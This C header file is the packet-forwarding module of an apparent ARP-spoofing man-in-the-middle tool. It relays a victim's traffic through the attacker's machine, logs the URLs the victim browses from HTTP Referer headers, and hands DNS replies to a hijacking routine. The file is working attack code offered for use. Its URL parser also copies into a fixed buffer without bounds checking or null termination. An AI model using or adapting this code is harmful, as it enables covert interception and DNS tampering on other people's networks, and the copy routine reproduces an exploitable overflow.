/*
* MODULE: forward packet get from victim and gateway
* MAIN FUNCTION: Arpforward
* LICENSE: MIT License, Copyright (c) 2017 Yue Pan.
*/

#ifndef __PACKET_FORWARDER_H_
#define __PACKET_FORWARDER_H_

#include "head.h"

int HTMLPaser(char *buf) {
    char url[1024];
    char *ref = strstr(buf, "Referer");
    if (ref == NULL)
        return 1;
    char *end = strstr(ref + 1, "\n");
    if (end == NULL)
        return 1;
    memcpy(url, ref + 9, end - ref - 11);
    if (strlen(url) == 0)
        return 1;
    printf("%s\n", url);
}

int forward(char *dev, u_short pro_type, u_char *DST, u_char *SRC, const u_char *payload, int len, int Times) {

    /* definations */
    libnet_t *net_t = NULL;
    char errbuf[LIBNET_ERRBUF_SIZE];
    libnet_ptag_t p_tag;
    int res;

    /* start libnet */
    net_t = libnet_init(LIBNET_LINK_ADV, dev, errbuf);
    if (net_t == NULL) {
        printf("libnet start error\n");
        return 1;
    }

    /* build ethernet */
    p_tag = libnet_build_ethernet(DST, SRC, pro_type, payload, len, net_t, 0);
    if (p_tag == -1) {
        printf("libnet build error\n");
        libnet_destroy(net_t);
        return 1;
    }

    /* send packet */
    for (int i = 0; i < Times; i++) {
        res = libnet_write(net_t);
        if (res == -1) {
            //printf("IP libnet write error\n");
            libnet_destroy(net_t);
            return 1;
        }
    }
    
    /* success */
    libnet_destroy(net_t);
    return 0;
}

void getPacket(u_char *arg, const struct pcap_pkthdr *hp, const u_char *packet) {

    /* get args */
    MITM_info MITM_arg = *(MITM_info *)arg;
    int Times = 1;
    u_short type = EPT_IPv4;
    char *dev = MITM_arg.dev;
    u_char *victim_mac = MITM_arg.TARGET_MAC;
    u_char *gateway_mac = MITM_arg.GATEWAY_MAC;
    u_char *attacker_mac = MITM_arg.ATTACKER_MAC;
    u_char *victim_ip = MITM_arg.TARGET_IP;
    u_char *gateway_ip = MITM_arg.GATEWAY_IP;
    int mode = MITM_arg.mode;

    /* get packet information */
    ethernet_header *pEther = (ethernet_header *)packet;
    ip_header *pIpv4 = (ip_header *)(packet + 14);

    /* get packet form victim */
    if (!memcmp(pEther->SRC_mac, victim_mac, 6)) {
        if (mode == Get && pIpv4->protocol_type == PROTOCOL_TCP) {
            tcp_header *pTcp = (tcp_header *)(packet + 34);
            if (ntohs(pTcp->dest_port) == 80) {
                char *data = (char *)(packet + 54);
                HTMLPaser(data);
            }
        }
        forward(dev, type, gateway_mac, attacker_mac, packet + 14, hp->len - 14, Times);
    }
    
    else if (!memcmp(pEther->SRC_mac, gateway_mac, 6)) {
        if (mode == Dns && pIpv4->protocol_type == PROTOCOL_UDP) {
            udp_header *pUdp = (udp_header *)(packet + 34);
            if (ntohs(pUdp->sour_port) == 53) {
                u_char *dns_packet = (u_char *)(packet + 42);
                DNSHijack(dns_packet);
            }
        }
        forward(dev, type, victim_mac, attacker_mac, packet + 14, hp->len - 14, Times);
    }
}

int forward_packet(void *ARG) {

    /* defination */
    MITM_info arg = *(MITM_info *)ARG;
    char *dev = arg.dev;
    char errbuf[PCAP_ERRBUF_SIZE];
    struct bpf_program filter;
    
    /* start dev */
    dev = pcap_lookupdev(errbuf);
    if (dev == NULL) {
        printf("%s\n", errbuf);
        exit(1);
    }
    arg.dev = dev;

    /* open device */
    pcap_t *handle = pcap_open_live(dev, 65535, 1, 0, errbuf);
    if (!handle) {
        printf("device open error.\n");
        exit(1);
    }

    /* compile filter */
    pcap_compile(handle, &filter, arg.filter, 1, 0);  
    pcap_setfilter(handle, &filter);

    /* capture packets */
    pcap_loop(handle, -1, getPacket, (u_char *)&arg);

    /* end */
    pcap_close(handle);

    return 0;
}

#endif